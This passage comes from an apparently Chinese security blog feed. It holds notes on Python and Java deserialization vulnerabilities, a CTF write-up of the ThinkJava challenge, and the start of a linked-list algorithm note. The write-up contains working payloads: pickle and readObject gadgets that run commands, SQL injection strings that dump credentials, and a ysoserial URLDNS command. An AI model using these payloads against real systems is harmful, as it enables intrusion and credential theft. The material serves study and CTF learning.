class="string">&quot;111&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&#x27;calc&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">p_a = pickle.dumps(a)</span><br><span class="line">pickle.loads(p_a)</span><br><span class="line"><span class="built_in">print</span>(p_a)</span><br></pre></td></tr></table></figure><p><code>__init__</code> 本质就是python中的构造函数，在对象被实例化时调用<br><code>__reduce_ex__()</code> 反序列化时调用<br><code>__setstate__()</code> 反序列化时调用<br><code>__getstate__()</code> 序列化时调用</p><p>Python代码审计工具 bandit</p><h1 id="CVE分析"><a href="#CVE分析" class="headerlink" title="CVE分析"></a>CVE分析</h1><h2 id="CVE-2019-6446-Numpy反序列化命令执行"><a href="#CVE-2019-6446-Numpy反序列化命令执行" class="headerlink" title="CVE-2019-6446 Numpy反序列化命令执行"></a>CVE-2019-6446 Numpy反序列化命令执行</h2><p><a href="https://www.freebuf.com/vuls/194540.html">https://www.freebuf.com/vuls/194540.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化漏洞 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Web安全】反序列化漏洞分析笔记 - 第二部分 Java反序列化分析</title>
      <link href="/2024/09/12/WebSecurity/owasptop/javadeserialization/"/>
      <url>/2024/09/12/WebSecurity/owasptop/javadeserialization/</url>
      
        <content type="html"><![CDATA[<p><a href="https://cloud.tencent.com/developer/article/1590955">参考</a><br><a href="https://paper.seebug.org/312/">https://paper.seebug.org/312/</a></p><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>其实和PHP的反序列化差不多，本来想写在一起的还是分开了,Java和PHP最大的不同我感觉就是利用的触发方式，PHP因为有魔术方法所以更多（虽然但是Java也有反射）。<br>HTTP：多平台之间的通信，管理等<br>RMI：是Java的一组拥护开发分布式应用程序的API，实现了不同操作系统之间程序的方法调用。值得注意的是，RMI的传输100%基于反序列化，Java RMI的默认端口是1099端口。<br>JMX：JMX是一套标准的代理和服务，用户可以在任何Java应用程序中使用这些代理和服务实现管理,中间件软件WebLogic的管理页面就是基于JMX开发的，而JBoss则整个系统都基于JMX构架。</p><p>只有实现了Serializable接口的类的对象才可以被序列化，Serializable 接口是启用其序列化功能的接口。</p><p>Java接口： Serializable Externalizable 接口、fastjson、jackson、gson、ObjectInputStream.read、ObjectObjectInputStream.readUnshared、XMLDecoder.read、ObjectYaml.loadXStream.fromXML、ObjectMapper.readValue、JSON.parseObject 等</p><p>Java反序列化后的数据会有一些特征，这在黑盒测试中很有用：<br>以 rO0AB 开头，可以确定这串就是 JAVA 序列化 base64 加密的数据（Java 序列化协议的二进制标识符 aced 0005，是 Java 序列化协议的固定魔术头）<br>或者如果以 aced 开头，那么则可能是 java 序列化的 16 进制。</p><p>可能会出现的地方：http参数，cookie，sesion，存储方式可能是base64(rO0），压缩后的base64(H4s),MII等Servlets http,Sockets,Session管理器，包含的协议就包括：JMX,RMI,JMS,JND1等(\xac\Xed) xm lXstream,XmldEcoder等（http Body:Content-type: application&#x2F;xml）json(jackson,fastjson)http请求中包含</p><p>利用工具：<a href="https://github.com/frohoff/ysoserial%EF%BC%8C%E5%88%A9%E7%94%A8%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%8Chttps://github.com/NickstaDB/SerializationDumper">https://github.com/frohoff/ysoserial，利用原生类的反序列化，https://github.com/NickstaDB/SerializationDumper</a> 还原Java的序列化数据</p><h1 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyObject</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="comment">//重写readObject()方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, IOException &#123;</span><br><span class="line">        <span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">//执行打开计算器程序命令</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testSerialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//定义myObj对象</span></span><br><span class="line">        <span class="type">MyObject</span> <span class="variable">myObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObject</span>();</span><br><span class="line">        myObj.name = <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        <span class="comment">//创建一个包含对象进行反序列化信息的”object”数据文件</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        <span class="comment">//writeObject()方法将myObj对象写入object文件</span></span><br><span class="line">        os.writeObject(myObj);</span><br><span class="line">        os.close();</span><br><span class="line">        <span class="comment">//从文件中反序列化obj对象</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//恢复对象</span></span><br><span class="line">        <span class="type">MyObject</span> <span class="variable">objectFromDisk</span> <span class="operator">=</span> (MyObject)ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上面代码所示，电脑会弹出计算器</p><h1 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h1><p><a href="https://xz.aliyun.com/t/13279?time__1311=GqmxuD0DnAitKGNeeeqBK40KbqWqyGrEbD">https://xz.aliyun.com/t/13279?time__1311=GqmxuD0DnAitKGNeeeqBK40KbqWqyGrEbD</a></p><h2 id="网鼎杯2020朱雀组-ThinkJava"><a href="#网鼎杯2020朱雀组-ThinkJava" class="headerlink" title="[网鼎杯2020朱雀组]ThinkJava"></a>[网鼎杯2020朱雀组]ThinkJava</h2><p><a href="https://www.cnblogs.com/Fluorescence-tjy/p/11222052.html">https://www.cnblogs.com/Fluorescence-tjy/p/11222052.html</a><br><a href="https://c.biancheng.net/view/5532.html">https://c.biancheng.net/view/5532.html</a><br><a href="https://www.cnblogs.com/h3zh1/p/12914439.html">https://www.cnblogs.com/h3zh1/p/12914439.html</a></p><p>这道题开始拿到的有个url，访问时显示没有权限，暂时没有突破点，还有个class压缩包，其中有一些代码，打开后发现有相关的数据库操作类，其中有个swagger，想到swagger的未授权访问，这里用曾哥的脚本扫描下<br><img src="/2024/09/12/WebSecurity/owasptop/javadeserialization/image.png"><br><a href="https://github.com/AabyssZG/SpringBoot-Scan">https://github.com/AabyssZG/SpringBoot-Scan</a><br><img src="/2024/09/12/WebSecurity/owasptop/javadeserialization/image-1.png"><br>访问页面发现有swagger接口测试的口子<br><img src="/2024/09/12/WebSecurity/owasptop/javadeserialization/image-2.png"><br>观察发现sqlDict，对应下载下来的代码中sqlDict类，这个类的方法<code>getTableData</code>存在sql注入的可能性<br>分析下载的sqlDict代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlDict</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SqlDict</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title function_">getConnection</span><span class="params">(String dbName, String user, String pass)</span> &#123;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (dbName != <span class="literal">null</span> &amp;&amp; !dbName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                dbName = <span class="string">&quot;jdbc:mysql://mysqldbserver:3306/&quot;</span> + dbName;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dbName = <span class="string">&quot;jdbc:mysql://mysqldbserver:3306/myapp&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (user == <span class="literal">null</span> || dbName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                user = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pass == <span class="literal">null</span> || dbName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                pass = <span class="string">&quot;abc@12345&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            conn = DriverManager.getConnection(dbName, user, pass);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var5) &#123;</span><br><span class="line">            var5.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException var6) &#123;</span><br><span class="line">            var6.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> conn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;Table&gt; <span class="title function_">getTableData</span><span class="params">(String dbName, String user, String pass)</span> &#123;</span><br><span class="line">        List&lt;Table&gt; Tables = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> getConnection(dbName, user, pass);</span><br><span class="line">        <span class="type">String</span> <span class="variable">TableName</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line">            <span class="type">DatabaseMetaData</span> <span class="variable">metaData</span> <span class="operator">=</span> conn.getMetaData();</span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">tableNames</span> <span class="operator">=</span> metaData.getTables((String)<span class="literal">null</span>, (String)<span class="literal">null</span>, (String)<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;TABLE&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(tableNames.next()) &#123;</span><br><span class="line">                TableName = tableNames.getString(<span class="number">3</span>);</span><br><span class="line">                <span class="type">Table</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Table</span>();</span><br><span class="line">                <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#x27;&quot;</span> + dbName + <span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + TableName + <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">                <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(sql);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(rs.next()) &#123;</span><br><span class="line">                    table.setTableDescribe(rs.getString(<span class="string">&quot;TABLE_COMMENT&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                table.setTableName(TableName);</span><br><span class="line">                <span class="type">ResultSet</span> <span class="variable">data</span> <span class="operator">=</span> metaData.getColumns(conn.getCatalog(), (String)<span class="literal">null</span>, TableName, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                <span class="type">ResultSet</span> <span class="variable">rs2</span> <span class="operator">=</span> metaData.getPrimaryKeys(conn.getCatalog(), (String)<span class="literal">null</span>, TableName);</span><br><span class="line"></span><br><span class="line">                String PK;</span><br><span class="line">                <span class="keyword">for</span>(PK = <span class="string">&quot;&quot;</span>; rs2.next(); PK = rs2.getString(<span class="number">4</span>)) &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(data.next()) &#123;</span><br><span class="line">                    <span class="type">Row</span> <span class="variable">row</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Row</span>(data.getString(<span class="string">&quot;COLUMN_NAME&quot;</span>), data.getString(<span class="string">&quot;TYPE_NAME&quot;</span>), data.getString(<span class="string">&quot;COLUMN_DEF&quot;</span>), data.getString(<span class="string">&quot;NULLABLE&quot;</span>).equals(<span class="string">&quot;1&quot;</span>) ? <span class="string">&quot;YES&quot;</span> : <span class="string">&quot;NO&quot;</span>, data.getString(<span class="string">&quot;IS_AUTOINCREMENT&quot;</span>), data.getString(<span class="string">&quot;REMARKS&quot;</span>), data.getString(<span class="string">&quot;COLUMN_NAME&quot;</span>).equals(PK) ? <span class="string">&quot;true&quot;</span> : <span class="literal">null</span>, data.getString(<span class="string">&quot;COLUMN_SIZE&quot;</span>));</span><br><span class="line">                    table.list.add(row);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Tables.add(table);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException var16) &#123;</span><br><span class="line">            var16.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Tables;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码使用jdbc连接数据库，且我们可以知道的是数据库连接的账号密码，以及存在myapp库。<br>我们可控的变量是 dbName ，正常来说 dbname 应当是个数据库名称<br>所以我们应当构造 dbname ，既能够使数据库成功连接到myapp库，又能够闭合执行语句，执行我们自定义的代码<br><a href="https://www.cnblogs.com/ljl150/p/12045942.html">https://www.cnblogs.com/ljl150/p/12045942.html</a><br>JDBC解析数据库的方式类似于URL解析，也就是在构造这条语句时：<code>dbName = &quot;jdbc:mysql://mysqldbserver:3306/&quot; + dbName;</code><br>我们需要传入的dbName被成功解析为myapp，有两种思路构造：</p><ul><li>#的方式：在url中#表示锚点，表示网页中的一个位置，比如http:xxx&#x2F;index.html#aaa，浏览器读取这个url，会将aaa移到可视位置。在第一个#，都会被视为位置标识符，不会被发送到服务端</li><li>?参数 的方式，因为在URL中？后面的内容将被视为参数，就可以构造类似这样的http:xxx&#x2F;index.html?a&#x3D;1，后面再跟闭合和注入语句</li></ul><p>那么我们构造下面的payload获取数据库的表名：<br><code>myapp?a=111&#39; union select group_concat(table_name) from (information_schema.tables);#</code><br>得到如下输出：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;list&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;isAuto&quot;</span><span class="punctuation">:</span> <span class="string">&quot;YES&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;isNull&quot;</span><span class="punctuation">:</span> <span class="string">&quot;NO&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;isPK&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;id&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;INT&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;isAuto&quot;</span><span class="punctuation">:</span> <span class="string">&quot;NO&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;isNull&quot;</span><span class="punctuation">:</span> <span class="string">&quot;YES&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="string">&quot;256&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;VARCHAR&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;isAuto&quot;</span><span class="punctuation">:</span> <span class="string">&quot;NO&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;isNull&quot;</span><span class="punctuation">:</span> <span class="string">&quot;YES&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pwd&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="string">&quot;256&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;VARCHAR&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;tableName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;操作成功&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;timestamps&quot;</span><span class="punctuation">:</span> <span class="number">1726551375306</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>判断得user表中存在name和pwd字段，构造下面的payload查询：<br><code>myapp?a=111&#39; union select group_concat(name, pwd) from (user);#</code><br>得到账号密码为：admin admin@Rrrr_ctf_asde，接着利用上面的接口测试<br><img src="/2024/09/12/WebSecurity/owasptop/javadeserialization/image-3.png"><br>这里看到返回的值，明显是java序列化后的特征，使用获取到的凭证测试第一个接口post &#x2F;common&#x2F;user&#x2F;current 成功执行，判断该接口对数据进行反序列化，使用ysoserial测试：<br><a href="https://blog.csdn.net/st3pby/article/details/135111050">https://blog.csdn.net/st3pby/article/details/135111050</a><br><code>java -jar ysoserial-all.jar URLDNS &quot;http://xho2o5.dnslog.cn&quot; &gt; f.txt</code><br>之后使用脚本处理下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;f.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line">now = file.read()</span><br><span class="line">ba = base64.b64encode(now)</span><br><span class="line"><span class="built_in">print</span>(ba)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p>将处理后的数据作为token传输，成功验证存在漏洞，之后就可以通过反弹shell等方式获取flag</p><p>待办：cc链 Cb链分析</p><h2 id="DASCTF-Java反序列化-easyjava"><a href="#DASCTF-Java反序列化-easyjava" class="headerlink" title="[DASCTF][Java反序列化]easyjava"></a>[DASCTF][Java反序列化]easyjava</h2><p><a href="https://blog.csdn.net/solitudi/article/details/119322658">https://blog.csdn.net/solitudi/article/details/119322658</a></p><h1 id="CVE漏洞"><a href="#CVE漏洞" class="headerlink" title="CVE漏洞"></a>CVE漏洞</h1><h2 id="Jboss-反序列化-CVE-2017-12149"><a href="#Jboss-反序列化-CVE-2017-12149" class="headerlink" title="Jboss 反序列化(CVE-2017-12149)"></a>Jboss 反序列化(CVE-2017-12149)</h2><p><a href="https://www.cnblogs.com/sainet/p/15632205.html">https://www.cnblogs.com/sainet/p/15632205.html</a></p><h2 id="Weblogic反序列化（CVE-2023-21839）"><a href="#Weblogic反序列化（CVE-2023-21839）" class="headerlink" title="Weblogic反序列化（CVE-2023-21839）"></a>Weblogic反序列化（CVE-2023-21839）</h2><p><a href="https://www.cnblogs.com/BlogVice-2203/p/17454727.html">https://www.cnblogs.com/BlogVice-2203/p/17454727.html</a></p><h2 id="Fastjson-反序列化"><a href="#Fastjson-反序列化" class="headerlink" title="Fastjson 反序列化"></a>Fastjson 反序列化</h2><p><a href="https://blog.nsfocus.net/fastjson-remote-deserialization-program-validation-analysis/">https://blog.nsfocus.net/fastjson-remote-deserialization-program-validation-analysis/</a></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化漏洞 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【算法】链表</title>
      <link href="/2024/09/11/algorithm/List/"/>
      <url>/2024/09/11/algorithm/List/</url>
      
        <content type="html"><![CDATA[<p>算法系列文章目前是跟着<a href="https://www.programmercarl.com/">代码随想录</a>学习</p><h2 id="链表基础"><a href="#链表基础" class="headerlink" title="链表基础"></a>链表基础</h2><p>单链表、双链表（每一个节点有两个指针域，一个指向下一个节点，一个指向上一个节点）、循环链表<br>链表操作的两种方式：直接使用原来的链表来进行操作。设置一个虚拟头结点在进行操作。<br>链表的存储方式：数组（内存中连续）、链表(内存中不连续)</p><h2 id="707-设计链表"><a href="#707-设计链表" class="headerlink" title="707.设计链表"></a>707.设计链表</h2><p>题意：<br>在链表类中实现这些功能：<br>get(index)：获取链表中第 index 个节点的值。如果索引无效，则返回-1。<br>addAtHead(val)：在链表的第一个元素之前添加一个值为 val 的节点。插入后，新节点将成为链表的第一个节点。<br>addAtTail(val)：将值为 val 的节点追加到链表的最后一个元素。<br>addAtIndex(index,val)：在链表中的第 index 个节点之前添加值为 val  的节点。如果 index 等于链表的长度，则该节点将附加到链表的末尾。如果 index 大于链表长度，则不会插入节点。如果index小于0，则在头部插入节点。<br>deleteAtIndex(index)：如果索引 index 有效，则删除链表中的第 index 个节点。</p><p>单链表版本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ListNode</span>&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    ListNode next;</span><br><span class="line">    ListNode()&#123;&#125;</span><br><span class="line">    ListNode(<span class="type">int</span> val)&#123;</span><br><span class="line">        <span class="built_in">this</span>.val = val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 